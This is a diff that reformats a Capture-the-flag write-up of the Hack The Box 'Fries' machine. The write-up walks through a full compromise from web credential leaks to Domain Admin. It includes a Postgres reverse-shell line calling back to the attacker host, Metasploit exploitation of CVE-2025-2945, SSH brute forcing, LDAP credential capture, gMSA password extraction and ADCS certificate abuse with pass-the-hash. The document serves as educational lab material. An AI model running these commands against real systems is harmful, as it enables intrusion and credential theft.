@@ -1,68 +1,71 @@
-# 🍟 Hack The Box — Fries (Hard)
+<div align="center">
 
-![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%2B%20Linux-blue)
-![Status](https://img.shields.io/badge/Status-Rooted-success)
+# Fries — HackTheBox
 
+![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Windows%20%2F%20Linux-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
-## ⚠️ Disclaimer
+</div>
 
-This writeup is for **educational use only** and was performed in an authorized Hack The Box environment.
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
 
----
+## Target Information
 
-## 🎯 Target Info
-
-| Field | Value |
-|------|------|
-| Target | <Your_IP_Address> |
-| Domain | fries.htb |
-| DC Hostname | dc01.fries.htb |
+| Property | Value |
+|----------|-------|
+| Machine | Fries |
+| IP | `<TARGET_IP>` |
+| OS | Windows / Linux |
 | Difficulty | Hard |
-| OS | Hybrid (Linux + Windows AD) |
+| Hostname | fries.htb |
+
+## Table of Contents
+
+1. [Port Scanning](#port-scanning)
+2. [Host Mapping](#host-mapping)
+3. [Initial Creds (HTB Provided)](#initial-creds-htb-provided)
+4. [Subdomain Discovery (FFUF)](#subdomain-discovery-ffuf)
+5. [Gitea Recon - DB Creds](#gitea-recon---db-creds)
+6. [PgAdmin Access - Postgres RCE](#pgadmin-access---postgres-rce)
+7. [CVE-2025-2945 - Meterpreter](#cve-2025-2945---meterpreter)
+8. [Password Reuse - SSH as svc](#password-reuse---ssh-as-svc)
+9. [NFS Weak Export - Docker TLS Abuse](#nfs-weak-export---docker-tls-abuse)
+10. [LDAP Credential Capture - svc_infra](#ldap-credential-capture---svc_infra)
+11. [BloodHound - ReadMSAPassword - gMSA](#bloodhound---readmsapassword---gmsa)
+12. [ADCS Abuse (ESC7 - ESC6/ESC16) - Domain Admin](#adcs-abuse-esc7---esc6esc16---domain-admin)
+13. [Flags](#flags)
 
 ---
 
-## 📑 Table of Contents
+## Port Scanning
 
-1. [Port Scanning](#-port-scanning)
-2. [Host Mapping](#-host-mapping)
-3. [Initial Creds (HTB Provided)](#-initial-creds-htb-provided)
-4. [Subdomain Discovery (FFUF)](#-subdomain-discovery-ffuf)
-5. [Gitea Recon → DB Creds](#-gitea-recon--db-creds)
-6. [PgAdmin Access → Postgres RCE](#-pgadmin-access--postgres-rce)
-7. [CVE-2025-2945 → Meterpreter](#-cve-2025-2945--meterpreter)
-8. [Password Reuse → SSH as svc](#-password-reuse--ssh-as-svc)
-9. [NFS Weak Export → Docker TLS Abuse](#-nfs-weak-export--docker-tls-abuse)
-10. [LDAP Credential Capture → svc_infra](#-ldap-credential-capture--svc_infra)
-11. [BloodHound → ReadMSAPassword → gMSA](#-bloodhound--readmsapassword--gmsa)
-12. [ADCS Abuse (ESC7 → ESC6/ESC16) → DA](#-adcs-abuse-esc7--esc6esc16--da)
-13. [Flags](#-flags)
-
----
-
-# 🔎 Port Scanning
-
-## Full Port Scan
+### Full Port Scan
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP>
 ```
 
-## Service Scan
+### Service Scan
 
 ```bash
-nmap -sCV -p<PORTS> <IP>
+nmap -sCV -p<PORTS> <TARGET_IP>
 ```
 
 <details>
-<summary>📌 Nmap Output (click to expand)</summary>
+<summary>Nmap Output (click to expand)</summary>
 
 ```text
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
-Nmap scan report for <Your_IP_Address>
+Nmap scan report for <TARGET_IP>
 Host is up (0.032s latency).
 
 PORT      STATE SERVICE       VERSION
@@ -88,48 +91,48 @@ Service Info: Host: DC01; OSs: Linux, Windows
 
 </details>
 
-### ✅ Key Takeaways
+### Key Takeaways
 
-- Windows AD services: **Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985)**
-- Linux web presence: **nginx (80/443)**
-- Domain discovered: **fries.htb**
+- Windows AD services: Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985)
+- Linux web presence: nginx (80/443)
+- Domain discovered: fries.htb
 - Likely hybrid environment: Linux web host + Windows DC
 
 ---
 
-# 🧾 Host Mapping
+## Host Mapping
 
 ```bash
 sudo nano /etc/hosts
 ```
 
-Add:
+Add the following entry:
 
 ```text
-<IP>    fries.htb dc01.fries.htb
+<TARGET_IP>    fries.htb dc01.fries.htb
 ```
 
 ---
 
-# 🔑 Initial Creds (HTB Provided)
+## Initial Creds (HTB Provided)
 
 ```text
 User: d.cooper@fries.htb
 Pass: D4LE11maan!!
 ```
 
-These did **not** work for SSH or SMB initially — so they were likely intended for web apps.
+These did not work for SSH or SMB initially -- they were likely intended for web apps.
 
 ---
 
-# 🌐 Subdomain Discovery (FFUF)
+## Subdomain Discovery (FFUF)
 
 ```bash
 ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
 ```
 
 <details>
-<summary>FFUF Output</summary>
+<summary>FFUF Output (click to expand)</summary>
 
 ```text
 code [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
@@ -137,23 +140,23 @@ code [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
 
 </details>
 
-Add:
+Update the hosts file:
 
 ```bash
 sudo nano /etc/hosts
 ```
 
 ```text
-<IP>    fries.htb dc01.fries.htb code.fries.htb
+<TARGET_IP>    fries.htb dc01.fries.htb code.fries.htb
 ```
 
-Visiting `http://code.fries.htb` reveals **Gitea**.
+Visiting `http://code.fries.htb` reveals Gitea.
 
-✅ HTB creds work here → login successful.
+HTB creds work here -- login successful.
 
 ---
 
-# 🧠 Gitea Recon → DB Creds
+## Gitea Recon - DB Creds
 
 In commits, a `.env` file revealed PostgreSQL connection details:
 
@@ -162,21 +165,21 @@ DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
 SECRET_KEY=y0st528wn1idjk3b9a
 ```
 
-Another repo README referenced a database management subdomain:
+Another repo README referenced a database management subdomain.
 
-Add:
+Update the hosts file:
 
 ```text
-<IP>    fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
+<TARGET_IP>    fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
 ```
 
-Visiting `db-mgmt05.fries.htb` shows **PgAdmin** login.
+Visiting `db-mgmt05.fries.htb` shows PgAdmin login.
 
 ---
 
-# 🐘 PgAdmin Access → Postgres RCE
+## PgAdmin Access - Postgres RCE
 
-### Login worked using HTB creds:
+### Login with HTB creds
 
 ```text
 User: d.cooper@fries.htb
@@ -189,11 +192,11 @@ When opening DB server, it asked for the DB root password:
 root password: PsqLR00tpaSS11
 ```
 
-✅ DB access confirmed.
+DB access confirmed.
 
 ---
 
-## PostgreSQL File Read + Command Execution
+### PostgreSQL File Read + Command Execution
 
 ```sql
 SELECT pg_ls_dir('/');             -- directory listing works
@@ -212,23 +215,23 @@ uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
 
 ---
 
-## Reverse Shell via COPY FROM PROGRAM
+### Reverse Shell via COPY FROM PROGRAM
 
-Listener:
+Start a listener on the attacker machine:
 
 ```bash
 nc -lvnp <PORT>
 ```
 
-Payload:
+Execute the payload via SQL:
 
 ```sql
 CREATE TABLE IF NOT EXISTS cmd_test(result text);
-COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"';
+COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1"';
 SELECT * FROM cmd_test;
 ```
 
-Shell:
+Shell received:
 
 ```text
 postgres@858fdf51af59:~/data$ whoami
@@ -237,7 +240,7 @@ postgres
 
 ---
 
-## Shell Sanitization (TTY)
+### Shell Sanitization (TTY)
 
 ```bash
 script /dev/null -c bash
@@ -258,9 +261,9 @@ stty rows <ROWS> columns <COLUMNS>
 
 ---
 
-# 🎯 CVE-2025-2945 — Authenticated RCE
+## CVE-2025-2945 - Authenticated RCE
 
-A quick search pointed to **CVE-2025-2945** in PgAdmin. Exploited using Metasploit:
+A quick search pointed to CVE-2025-2945 in PgAdmin. Exploited using Metasploit:
 
 ```bash
 msfconsole -q
@@ -270,7 +273,7 @@ use exploit/multi/http/pgadmin_query_tool_authenticated
 Set options:
 
 ```text
-set LHOST <IP_ATTACKER>
+set LHOST <YOUR_IP>
 set LPORT <PORT>
 set RHOSTS db-mgmt05.fries.htb
 set VHOST db-mgmt05.fries.htb
@@ -291,9 +294,9 @@ Server username: pgadmin
 
 ---
 
-# 🔐 Password Reuse → SSH as svc
+## Password Reuse - SSH as svc
 
-Environment variables revealed:
+Environment variables revealed credentials:
 
 ```bash
 env
@@ -306,7 +309,7 @@ PGADMIN_DEFAULT_EMAIL=admin@fries.htb
 PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
 ```
 
-I used this password to brute-force SSH users:
+This password was used to brute-force SSH users.
 
 ### users.txt
 
@@ -325,13 +328,13 @@ svc
 infra
 ```
 
-Hydra:
+Run Hydra against the target:
 
 ```bash
-hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
+hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<TARGET_IP> -t 64 -I
 ```
 
-✅ Valid hit:
+Valid hit:
 
 ```text
 login: svc   password: Friesf00Ds2025!!
@@ -340,14 +343,14 @@ login: svc   password: Friesf00Ds2025!!
 SSH access:
 
 ```bash
-ssh svc@<IP>
+ssh svc@<TARGET_IP>
 ```
 
 ---
 
-# 🧨 NFS Weak Export → Docker TLS Abuse
+## NFS Weak Export - Docker TLS Abuse
 
-## Export Check (Local)
+### Export Check (Local)
 
 ```bash
 showmount -e localhost
@@ -372,18 +375,18 @@ drwxrwx--- 2 root infra managers 4096 May 26 2025 certs
 
 ---
 
-## Pivot into Internal Network (sshuttle)
+### Pivot into Internal Network (sshuttle)
 
 On Kali:
 
 ```bash
 sudo apt install sshuttle
-sshuttle -r svc@<IP> -N
+sshuttle -r svc@<TARGET_IP> -N
 ```
 
 ---
 
-## NFS Tooling
+### NFS Tooling
 
 ```bash
 sudo apt update
@@ -391,13 +394,13 @@ sudo apt install pkg-config libfuse3-dev python3-dev
 pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
 ```
 
-Analyze:
+Analyze the NFS export:
 
 ```bash
 /root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
 ```
 
-Mount:
+Mount the export with fake UID to bypass permissions:
 
 ```bash
 mkdir /tmp/nfs_mount
@@ -407,12 +410,12 @@ ls -la /tmp/nfs_mount
 
 ---
 
-## Docker TLS Tunnel
+### Docker TLS Tunnel
 
-Tunnel docker port:
+Tunnel docker port through SSH:
 
 ```bash
-ssh svc@<IP> -L 2376:127.0.0.1:2376
+ssh svc@<TARGET_IP> -L 2376:127.0.0.1:2376
 ```
 
 Attempt docker listing:
@@ -425,7 +428,7 @@ docker --tlsverify \
   -H=tcp://127.0.0.1:2376 ps
 ```
 
-Authorization failed due to wrong cert identity → generate **root** cert using CA.
+Authorization failed due to wrong cert identity -- generate a root cert using the CA.
 
 ### Generate Root Cert
 
@@ -435,7 +438,7 @@ openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
 openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
 ```
 
-Now list containers:
+Now list containers with the newly generated root cert:
 
 ```bash
 docker --tlsverify \
@@ -445,11 +448,11 @@ docker --tlsverify \
   -H=tcp://127.0.0.1:2376 ps
 ```
 
-✅ Containers visible.
+Containers visible.
 
 ---
 
-# 🧲 LDAP Credential Capture → svc_infra
+## LDAP Credential Capture - svc_infra
 
 Entered the `pwm` container (LDAP-connected):
 
@@ -461,19 +464,19 @@ docker --tlsverify \
   -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
 ```
 
-Found LDAP URL in:
+Found LDAP URL in the PWM configuration:
 
 ```bash
 cat /config/PwmConfiguration.xml | grep "ldap"
 ```
 
-Modified it to point to attacker:
+Modified it to point to attacker machine:
 
 ```bash
-sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
+sed -i 's|ldaps://dc01.fries.htb:636|ldap://<YOUR_IP>:389|' PwmConfiguration.xml
 ```
 
-On attacker, run responder:
+On attacker, run responder to capture credentials:
 
 ```bash
 responder -I tun0 -wdv
@@ -486,30 +489,30 @@ CN=svc_infra,CN=Users,DC=fries,DC=htb
 Password: m6tneOMAh5p0wQ0d
 ```
 
-Validate:
+Validate the credentials:
 
 ```bash
-netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
+netexec ldap <TARGET_IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
 ```
 
-✅ Valid.
+Valid.
 
 ---
 
-# 🩸 BloodHound → ReadMSAPassword → gMSA
+## BloodHound - ReadMSAPassword - gMSA
 
-Collect data:
+Collect BloodHound data:
 
 ```bash
-bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<IP>' -c All --zip
+bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<TARGET_IP>' -c All --zip
 ```
 
-BloodHound showed `svc_infra` has **ReadMSAPassword** over `GMSA_CA_PROD$`.
+BloodHound showed `svc_infra` has ReadMSAPassword over `GMSA_CA_PROD$`.
 
 Extract managed password:
 
 ```bash
-bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
+bloodyAD --host <TARGET_IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
 ```
 
 Output:
@@ -518,36 +521,36 @@ Output:
 msDS-ManagedPassword.NT: fc20b3d3ec179c5339ca59fbefc18f4a
 ```
 
-WinRM PTH:
+WinRM pass-the-hash:
 
 ```bash
-evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
+evil-winrm -i <TARGET_IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
 ```
 
-✅ Access gained.
+Access gained.
 
 ---
 
-# 🏛️ ADCS Abuse (ESC7 → ESC6/ESC16) → Domain Admin
+## ADCS Abuse (ESC7 - ESC6/ESC16) - Domain Admin
 
-Find vulnerable templates:
+Find vulnerable certificate templates:
 
 ```bash
-certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
+certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <TARGET_IP> -vulnerable
 ```
 
 Detected:
 
-- ✅ ESC7 — dangerous permissions  
-- ✅ ESC6 — enrollee can specify SAN  
-- ✅ ESC16 — security extension disabled  
+- ESC7 -- dangerous permissions
+- ESC6 -- enrollee can specify SAN
+- ESC16 -- security extension disabled
 
 ---
 
-## ESC6 Exploitation: Request Admin Certificate
+### ESC6 Exploitation: Request Admin Certificate
 
 ```bash
-certipy-ad req -u "svc_infra" -p "m6tneOMAh5p0wQ0d" -dc-ip "<IP>" \
+certipy-ad req -u "svc_infra" -p "m6tneOMAh5p0wQ0d" -dc-ip "<TARGET_IP>" \
 -ca 'fries-DC01-CA' -template 'User' \
 -upn 'administrator@fries.htb' \
 -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
@@ -557,7 +560,7 @@ Authenticate and dump hash:
 
 ```bash
 ntpdate fries.htb
-certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -username 'Administrator' -domain 'fries.htb'
+certipy-ad auth -pfx "administrator.pfx" -dc-ip '<TARGET_IP>' -username 'Administrator' -domain 'fries.htb'
 ```
 
 Got hash:
@@ -566,38 +569,41 @@ Got hash:
 aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
 ```
 
-WinRM PTH as Administrator:
+WinRM pass-the-hash as Administrator:
 
 ```bash
-evil-winrm -i <IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
+evil-winrm -i <TARGET_IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
 ```
 
-✅ Domain Admin access achieved.
+Domain Admin access achieved.
 
 ---
 
-# 🏁 Flags
-
-> **root.txt**
+## Attack Chain Summary
 
 ```text
-<REDACTED_ROOT_FLAG>
-```
-
-> **user.txt**
-
-```text
-<REDACTED_USER_FLAG>
+FFUF subdomain -> Gitea creds leak -> PgAdmin access -> Postgres RCE -> CVE RCE -> env password reuse
+-> SSH svc -> NFS weak export -> Docker TLS CA abuse -> LDAP redirect -> svc_infra creds
+-> BloodHound ReadMSAPassword -> gMSA WinRM -> ADCS ESC chain -> Administrator hash -> Domain Admin
 ```
 
 ---
 
-# 🧠 Attack Chain Summary
+## Flags
 
-```text
-FFUF subdomain → Gitea creds leak → PgAdmin access → Postgres RCE → CVE RCE → env password reuse
-→ SSH svc → NFS weak export → Docker TLS CA abuse → LDAP redirect → svc_infra creds
-→ BloodHound ReadMSAPassword → gMSA WinRM → ADCS ESC chain → Administrator hash → Domain Admin
-```
+| Flag | Value |
+|------|-------|
+| User | `<REDACTED>` |
+| Root | `<REDACTED>` |
 
-✅ **Machine rooted successfully.**
+---
+
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Fries*
+
+</div>
